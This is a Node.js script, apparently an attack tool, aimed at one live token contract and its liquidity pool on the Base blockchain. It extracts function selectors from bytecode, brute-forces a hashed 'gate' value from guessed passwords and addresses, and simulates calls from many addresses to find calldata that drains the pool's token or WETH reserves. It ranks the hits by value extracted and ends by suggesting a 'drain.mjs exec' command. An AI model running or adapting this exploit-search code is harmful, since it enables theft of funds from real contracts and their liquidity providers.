import fs from "node:fs";
import { JsonRpcProvider, AbiCoder, Interface, keccak256, toUtf8Bytes,
  solidityPacked, MaxUint256, ZeroAddress, formatUnits, getAddress } from "ethers";
const ME="0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const PAIR="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const WETH="0x4200000000000000000000000000000000000006";
const MC3="0xcA11bde05977b3631167028862bE2a173976CA11";
const ABI=AbiCoder.defaultAbiCoder();
const MCI=new Interface(["function tryAggregate(bool,tuple(address target,bytes callData)[])"]);
const DIR=process.env.HOME+"/slop/out";
const log=s=>{console.log(s);fs.appendFileSync(DIR+"/main.log",s+"\n")};
const pad=v=>v.replace(/^0x/,"").padStart(64,"0");
const balD=a=>"0x70a08231"+pad(a);
const RPCS=[process.env.RPC,"https://mainnet.base.org","https://base.llamarpc.com",
 "https://base-rpc.publicnode.com","https://1rpc.io/base","https://base.drpc.org"].filter(Boolean);
let p=null;
for(const u of RPCS){try{const q=new JsonRpcProvider(u,8453,{staticNetwork:true});
  await q.getBlockNumber(); p=q; log("RPC: "+u); break}catch{}}
if(!p){log("ما في RPC شغال");process.exit(1)}
const bal=async(t,w)=>{try{return BigInt(await p.call({to:t,data:balD(w)}))}catch{return 0n}};
const sim=async(calls,from)=>{const d=MCI.encodeFunctionData("tryAggregate",[false,calls.map(c=>[c.target,c.data])]);
  const raw=await p.call({to:MC3,data:d,from,gasLimit:30_000_000});
  return MCI.decodeFunctionResult("tryAggregate",raw)[0].map(r=>({ok:r[0],ret:r[1]}))};

log("block: "+await p.getBlockNumber());
const code=await p.getCode(T); fs.writeFileSync(DIR+"/bytecode.txt",code);
const h=code.slice(2), sels=new Set();
for(let i=0;i<h.length-10;i+=2) if(h.slice(i,i+2)==="63") sels.add("0x"+h.slice(i+2,i+10));
sels.delete("0x00000000"); sels.delete("0xffffffff");
const st=[]; for(let i=0;i<320;i++){const v=await p.getStorage(T,i); if(!/^0x0+$/.test(v)) st.push(v)}
const stAddrs=[...new Set(st.filter(v=>/^0x0{24}[0-9a-f]{40}$/.test(v)).map(v=>getAddress("0x"+v.slice(-40))))];
const GATE=await p.getStorage(T,26);
log("selectors="+sels.size+" slots="+st.length+" addrs="+stAddrs.join(","));

const WORDS=["slop","Slop","SLOP","slopcash","SlopCash","Slop Cash","SLOP CASH","slopiscash",
 "SLOP IS CASH","cash","secret","password","admin","123","1234","123456","base","umia","shaw",
 "eliza","elizaos","slop123","slopcash123","test","moon","slop2026","dead","222","gslop","virgen"];
const salts=[ME,...stAddrs,ZeroAddress,T,PAIR];
let gate=null;
for(const w of WORDS){const s=[[keccak256(toUtf8Bytes(w)),w]];
  for(const a of salts){s.push([keccak256(solidityPacked(["address","string"],[a,w])),a+"+"+w]);
    s.push([keccak256(solidityPacked(["string","address"],[w,a])),w+"+"+a])}
  for(const [k,v] of s) if(k.toLowerCase()===GATE.toLowerCase()){gate=v;log(">>> GATE "+v)}}
for(const a of salts) if(keccak256(solidityPacked(["address"],[a])).toLowerCase()===GATE.toLowerCase()){gate=a;log(">>> GATE addr "+a)}

const rS=await bal(T,PAIR), rW=await bal(WETH,PAIR), price=rS?rW*10n**9n/rS:0n;
log(`POOL SLOP=${formatUnits(rS,9)} WETH=${formatUnits(rW,18)}`);
const F=(n,t,f)=>({n,t,f});
const forms=[F("()",[],()=>[]),F("(addr)",["address"],s=>[s]),
 F("(addr,max)",["address","uint256"],s=>[s,MaxUint256]),F("(addr,pairBal)",["address","uint256"],s=>[s,rS]),
 F("(max)",["uint256"],()=>[MaxUint256]),F("(0)",["uint256"],()=>[0n]),F("(true)",["bool"],()=>[true]),
 F("(pair)",["address"],()=>[PAIR]),F("(gate)",["bytes32"],()=>[GATE]),
 F("(gate,addr)",["bytes32","address"],s=>[GATE,s]),F("(addr,pair)",["address","address"],s=>[s,PAIR]),
 F("(pair,max)",["address","uint256"],()=>[PAIR,MaxUint256]),
 F("(addr,pair,max)",["address","address","uint256"],s=>[s,PAIR,MaxUint256])];
const hits=[], list=[...sels], MAX=2n**256n-1n;
for(const from of [...new Set([ME,...stAddrs,ZeroAddress])]){
  for(const f of forms){ for(let i=0;i<list.length;i+=6){
    const g=list.slice(i,i+6), calls=[], meta=[];
    calls.push({target:T,data:"0x095ea7b3"+pad(T)+pad(MAX.toString(16))});
    calls.push({target:T,data:"0x095ea7b3"+pad(PAIR)+pad(MAX.toString(16))});
    for(const s of g){let d;try{d=s+ABI.encode(f.t,f.f(from)).slice(2)}catch{continue}
      calls.push({target:T,data:d},{target:T,data:balD(PAIR)},{target:WETH,data:balD(PAIR)},{target:T,data:balD(from)});
      meta.push({s,d})}
    if(!meta.length) continue;
    let res; try{res=await sim(calls,from)}catch(e){log("chunk fail "+from+" "+f.n+": "+(e.shortMessage||""));continue}
    let pS=rS,pW=rW;
    for(let k=0;k<meta.length;k++){
      const pr=res[2+k*4], aS=BigInt(res[3+k*4].ret||0), aW=BigInt(res[4+k*4].ret||0), aB=BigInt(res[5+k*4].ret||0);
      if(pr.ok&&(aS<pS||aW<pW)){const got=pS-aS, wl=pW-aW;
        hits.push({sel:meta[k].s,form:f.n,from,calldata:meta[k].d,
          delta:`pairSLOP -${formatUnits(got,9)} | pairWETH -${formatUnits(wl,18)} | لك ${formatUnits(aB,9)}`,
          score:String(wl+got*price/10n**9n)});
        log(`>>> HIT ${meta[k].s} ${f.n} from=${from} ${hits.at(-1).delta}`)}
      pS=aS;pW=aW}
    await new Promise(r=>setTimeout(r,200));
  }}
}
hits.sort((a,b)=>BigInt(b.score)>BigInt(a.score)?1:-1);
fs.writeFileSync(DIR+"/hits.json",JSON.stringify({gate,hits},null,2));
log("\nHITS: "+hits.length);
if(hits.length) log("\nخطة: node drain.mjs exec \""+hits[0].calldata+"\"");
process.exit(0);
